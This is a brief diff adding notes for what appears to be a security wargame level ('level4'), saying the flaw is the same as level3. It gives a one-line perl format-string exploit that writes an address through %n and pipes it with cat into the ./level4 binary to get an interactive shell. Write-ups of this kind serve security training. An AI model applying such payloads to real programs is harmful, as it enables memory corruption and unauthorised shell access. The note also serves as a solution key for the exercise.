@@ -1,0 +1,2 @@
+1. This is the same flaw as the precedent level3
+2. This is the exploit command : (perl -e 'print "\x10\x98\x04\x08" . "%16930111x %12\$n"'; cat) | ./level4
